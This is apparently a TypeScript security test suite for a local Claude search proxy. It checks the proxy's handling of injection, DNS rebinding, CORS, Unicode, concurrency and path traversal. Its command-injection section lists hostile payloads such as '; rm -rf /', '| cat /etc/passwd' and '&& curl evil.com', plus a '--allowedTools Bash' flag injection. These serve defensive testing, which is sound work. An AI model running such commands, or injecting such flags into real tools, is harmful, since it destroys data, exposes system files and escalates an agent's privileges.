/**
 * Security and pentest tests for claude-search-proxy.
 * Covers: injection, smuggling, DNS rebinding, Unicode attacks,
 * race conditions, session safety, and CORS.
 */

import { describe, it, afterEach } from 'node:test';
import assert from 'node:assert';
import http from 'http';
import type { ProxyConfig, ClaudeResult } from '../src/types.js';
import { ProxyServer } from '../src/server.js';

// --- Helpers (same pattern as server.test.ts) ---

function randomPort(): number {
  return 40000 + Math.floor(Math.random() * 10000);
}

async function request(
  port: number,
  method: string,
  path: string,
  body?: unknown,
  extraHeaders?: Record<string, string>
): Promise<{ status: number; headers: http.IncomingHttpHeaders; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: '127.0.0.1',
      port,
      path,
      method,
      headers: { 'Content-Type': 'application/json', ...extraHeaders }
    }, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk.toString(); });
      res.on('end', () => resolve({ status: res.statusCode!, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    if (body !== undefined) {
      req.write(typeof body === 'string' ? body : JSON.stringify(body));
    }
    req.end();
  });
}

function mockClaudeResult(text = 'Mock result'): ClaudeResult {
  return {
    type: 'result',
    subtype: 'success',
    is_error: false,
    duration_ms: 100,
    result: text,
    session_id: 'mock-session',
    total_cost_usd: 0.001,
    usage: { input_tokens: 5, output_tokens: 10, total_tokens: 15 }
  };
}

// Track servers for cleanup
const servers: Array<{ close: (cb: () => void) => void }> = [];

async function startServer(
  config: Partial<ProxyConfig> = {},
  mockResult?: ClaudeResult
): Promise<{ port: number }> {
  const port = randomPort();
  const fullConfig: ProxyConfig = {
    port,
    host: '127.0.0.1',
    model: 'claude-sonnet-4',
    maxSessionSearches: 20,
    timeout: 30000,
    verbose: false,
    ...config
  };
  const result = mockResult ?? mockClaudeResult();
  const mockExecutor = async () => result;
  const server = new ProxyServer(fullConfig, mockExecutor);
  const httpServer = await server.start();
  servers.push(httpServer);
  return { port };
}

afterEach(async () => {
  await Promise.all(servers.map(s => new Promise<void>(r => s.close(() => r()))));
  servers.length = 0;
});

// =============================================================
// 1. Command / Flag Injection via query content
// =============================================================
describe('Command Injection via query', () => {
  const shellPayloads = [
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    '| cat /etc/passwd',
    '&& curl evil.com',
    '\n--allowedTools Bash\n',
    '--help',
    '-p --output-format text',
  ];

  for (const payload of shellPayloads) {
    it(`should safely handle shell payload: ${payload.slice(0, 30)}`, async () => {
      let receivedQuery = '';
      const mockExecutor = async (opts: any) => {
        receivedQuery = opts.query;
        return mockClaudeResult();
      };

      const port = randomPort();
      const server = new ProxyServer({
        port, host: '127.0.0.1', model: 'claude-sonnet-4',
        maxSessionSearches: 20, timeout: 30000, verbose: false
      }, mockExecutor);
      const httpServer = await server.start();
      servers.push(httpServer);

      const res = await request(port, 'POST', '/v1/chat/completions', {
        messages: [{ role: 'user', content: payload }]
      });

      assert.strictEqual(res.status, 200);
      // The query should pass through as-is to the executor (stdin, not shell)
      assert.strictEqual(receivedQuery, payload.trim());
    });
  }
});

// =============================================================
// 2. Request Smuggling / Malformed Input
// =============================================================
describe('Malformed requests', () => {
  it('should reject empty messages array', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', { messages: [] });
    // extractQuery throws "No user message found" → should be 400 or 500
    assert.ok(res.status >= 400);
  });

  it('should reject missing messages field', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', { query: 'test' });
    assert.strictEqual(res.status, 400);
  });

  it('should reject messages as string instead of array', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', { messages: 'hello' });
    assert.strictEqual(res.status, 400);
  });

  it('should reject non-JSON body', async () => {
    const { port } = await startServer();
    const rawRes = await new Promise<{ status: number; body: string }>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port, path: '/v1/chat/completions',
        method: 'POST', headers: { 'Content-Type': 'application/json' }
      }, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk.toString(); });
        res.on('end', () => resolve({ status: res.statusCode!, body: data }));
      });
      req.on('error', reject);
      req.write('this is not json{{{');
      req.end();
    });
    assert.strictEqual(rawRes.status, 400);
  });

  it('should reject body exceeding 1MB', async () => {
    const { port } = await startServer();
    const hugeBody = JSON.stringify({
      messages: [{ role: 'user', content: 'x'.repeat(1_100_000) }]
    });
    const res = await new Promise<{ status: number; body: string }>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port, path: '/v1/chat/completions',
        method: 'POST', headers: { 'Content-Type': 'application/json' }
      }, (r) => {
        let data = '';
        r.on('data', (chunk) => { data += chunk.toString(); });
        r.on('end', () => resolve({ status: r.statusCode!, body: data }));
      });
      req.on('error', () => resolve({ status: 413, body: '' })); // connection reset is also acceptable
      req.write(hugeBody);
      req.end();
    });
    assert.ok(res.status === 413 || res.status === 400);
  });

  it('should reject query exceeding MAX_QUERY_LENGTH', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: 'a'.repeat(10_001) }]
    });
    assert.strictEqual(res.status, 400);
    assert.ok(res.body.includes('too long'));
  });

  it('should handle prototype pollution attempt in body', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: 'test' }],
      '__proto__': { 'admin': true },
      'constructor': { 'prototype': { 'isAdmin': true } }
    });
    // Should process normally (JSON.parse doesn't pollute prototypes)
    assert.strictEqual(res.status, 200);
    // Verify Object prototype wasn't polluted
    assert.strictEqual((Object.prototype as any).admin, undefined);
    assert.strictEqual((Object.prototype as any).isAdmin, undefined);
  });

  it('should handle deeply nested JSON without crashing', async () => {
    const { port } = await startServer();
    let nested: any = { role: 'user', content: 'test' };
    for (let i = 0; i < 100; i++) {
      nested = { wrap: nested };
    }
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [nested]
    });
    // No extractable user message in deeply nested structure → 500 (unhandled error from extractQuery)
    assert.ok(res.status >= 400 && res.status < 600, `Expected 4xx/5xx, got ${res.status}`);
  });

  it('should handle empty body', async () => {
    const { port } = await startServer();
    const res = await new Promise<{ status: number; body: string }>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port, path: '/v1/chat/completions',
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': '0' }
      }, (r) => {
        let data = '';
        r.on('data', (chunk) => { data += chunk.toString(); });
        r.on('end', () => resolve({ status: r.statusCode!, body: data }));
      });
      req.on('error', reject);
      req.end();
    });
    assert.strictEqual(res.status, 400);
  });
});

// =============================================================
// 3. DNS Rebinding Protection
// =============================================================
describe('DNS Rebinding', () => {
  it('should block external Host header', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, { 'Host': 'evil.com' });
    assert.strictEqual(res.status, 403);
  });

  it('should block Host that looks local but is not (subdomain trick)', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, { 'Host': '127.0.0.1.evil.com' });
    assert.strictEqual(res.status, 403);
  });

  it('should block non-localhost IP in Host', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, { 'Host': '192.168.1.1' });
    assert.strictEqual(res.status, 403);
  });

  it('should allow localhost Host header', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, { 'Host': 'localhost:' + port });
    assert.strictEqual(res.status, 200);
  });

  it('should allow 127.0.0.1 Host header', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, { 'Host': '127.0.0.1:' + port });
    assert.strictEqual(res.status, 200);
  });

  it('should allow request with no Host header', async () => {
    const { port } = await startServer();
    // Direct connection without Host — server.ts allows this (isLocalHost returns true for undefined)
    const res = await new Promise<{ status: number; body: string }>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port, path: '/health', method: 'GET',
        headers: {} // no Host — Node may add one automatically, but let's test the logic
      }, (r) => {
        let data = '';
        r.on('data', (chunk) => { data += chunk.toString(); });
        r.on('end', () => resolve({ status: r.statusCode!, body: data }));
      });
      req.on('error', reject);
      req.end();
    });
    // Node's http.request adds Host automatically, so this will be localhost — should pass
    assert.strictEqual(res.status, 200);
  });
});

// =============================================================
// 4. Unicode / Encoding Attacks
// =============================================================
describe('Unicode attacks', () => {
  it('should handle RTL override characters in query', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: 'test \u202E secret command' }]
    });
    assert.strictEqual(res.status, 200);
  });

  it('should handle zero-width characters', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: 'te\u200Bs\u200Ct \u200Dquery\uFEFF' }]
    });
    assert.strictEqual(res.status, 200);
  });

  it('should handle null bytes in query', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: 'test\x00query' }]
    });
    assert.strictEqual(res.status, 200);
  });

  it('should handle emoji and mixed scripts', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', {
      messages: [{ role: 'user', content: '🔍 поиск 搜索 بحث テスト' }]
    });
    assert.strictEqual(res.status, 200);
  });
});

// =============================================================
// 5. Race Conditions
// =============================================================
describe('Race conditions', () => {
  it('should handle 50 concurrent requests without crashing', async () => {
    let callCount = 0;
    const mockExecutor = async () => {
      callCount++;
      // Simulate slight delay
      await new Promise(r => setTimeout(r, 10));
      return mockClaudeResult(`Result ${callCount}`);
    };

    const port = randomPort();
    const server = new ProxyServer({
      port, host: '127.0.0.1', model: 'claude-sonnet-4',
      maxSessionSearches: 20, timeout: 30000, verbose: false
    }, mockExecutor);
    const httpServer = await server.start();
    servers.push(httpServer);

    const promises = Array.from({ length: 50 }, (_, i) =>
      request(port, 'POST', '/v1/chat/completions', {
        messages: [{ role: 'user', content: `query ${i}` }]
      })
    );

    const results = await Promise.all(promises);

    // All should succeed (queued and processed sequentially)
    for (const res of results) {
      assert.strictEqual(res.status, 200);
      const data = JSON.parse(res.body);
      assert.strictEqual(data.object, 'chat.completion');
    }
  });

  it('should handle requests during session rotation', async () => {
    let searchCount = 0;
    const mockExecutor = async () => {
      searchCount++;
      return mockClaudeResult(`Result ${searchCount}`);
    };

    const port = randomPort();
    const server = new ProxyServer({
      port, host: '127.0.0.1', model: 'claude-sonnet-4',
      maxSessionSearches: 3, // Low threshold to trigger rotation
      timeout: 30000, verbose: false
    }, mockExecutor);
    const httpServer = await server.start();
    servers.push(httpServer);

    // Fire 10 requests — should trigger multiple rotations (every 3 searches)
    const results = [];
    for (let i = 0; i < 10; i++) {
      const res = await request(port, 'POST', '/v1/chat/completions', {
        messages: [{ role: 'user', content: `query ${i}` }]
      });
      results.push(res);
    }

    for (const res of results) {
      assert.strictEqual(res.status, 200);
    }
  });
});

// =============================================================
// 6. Session ID Safety
// =============================================================
describe('Session ID safety', () => {
  it('should expose valid UUID in health endpoint', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health');
    const health = JSON.parse(res.body);
    const uuidRe = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
    // Session ID may be null during warmup or a valid UUID
    if (health.session.sessionId !== null) {
      assert.ok(uuidRe.test(health.session.sessionId), `Invalid UUID: ${health.session.sessionId}`);
    }
  });

  it('should not leak session IDs in error responses', async () => {
    const { port } = await startServer();
    const res = await request(port, 'POST', '/v1/chat/completions', { messages: 'invalid' });
    assert.strictEqual(res.status, 400);
    // Error body should NOT contain any UUID
    const uuidRe = /[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}/i;
    assert.ok(!uuidRe.test(res.body), `Session ID leaked in error: ${res.body}`);
  });
});

// =============================================================
// 7. CORS
// =============================================================
describe('CORS security', () => {
  it('should not reflect non-localhost origin', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, {
      'Origin': 'https://evil.com'
    });
    assert.strictEqual(res.status, 200);
    assert.strictEqual(res.headers['access-control-allow-origin'], undefined);
  });

  it('should reflect localhost origin', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, {
      'Origin': 'http://localhost:3000'
    });
    assert.strictEqual(res.headers['access-control-allow-origin'], 'http://localhost:3000');
  });

  it('should reflect 127.0.0.1 origin', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, {
      'Origin': 'http://127.0.0.1:8080'
    });
    assert.strictEqual(res.headers['access-control-allow-origin'], 'http://127.0.0.1:8080');
  });

  it('should handle OPTIONS preflight for localhost origin', async () => {
    const { port } = await startServer();
    const res = await new Promise<{ status: number; headers: http.IncomingHttpHeaders }>((resolve, reject) => {
      const req = http.request({
        hostname: '127.0.0.1', port, path: '/v1/chat/completions',
        method: 'OPTIONS',
        headers: { 'Origin': 'http://localhost:3000' }
      }, (r) => resolve({ status: r.statusCode!, headers: r.headers }));
      req.on('error', reject);
      req.end();
    });
    assert.strictEqual(res.status, 204);
    assert.strictEqual(res.headers['access-control-allow-origin'], 'http://localhost:3000');
    assert.ok(res.headers['access-control-allow-methods']?.includes('POST'));
  });

  it('should not use wildcard origin', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, {
      'Origin': 'http://localhost:3000'
    });
    assert.notStrictEqual(res.headers['access-control-allow-origin'], '*');
  });

  it('should not reflect origin for non-http scheme', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/health', undefined, {
      'Origin': 'file:///etc/passwd'
    });
    assert.strictEqual(res.headers['access-control-allow-origin'], undefined);
  });
});

// =============================================================
// 8. Path traversal / unknown routes
// =============================================================
describe('Route safety', () => {
  it('should return 404 for unknown paths', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/../../../etc/passwd');
    assert.strictEqual(res.status, 404);
  });

  it('should return 404 for path traversal attempts', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/v1/chat/completions/../../admin');
    assert.strictEqual(res.status, 404);
  });

  it('should return 404 for GET on POST-only endpoint', async () => {
    const { port } = await startServer();
    const res = await request(port, 'GET', '/v1/chat/completions');
    assert.strictEqual(res.status, 404);
  });
});
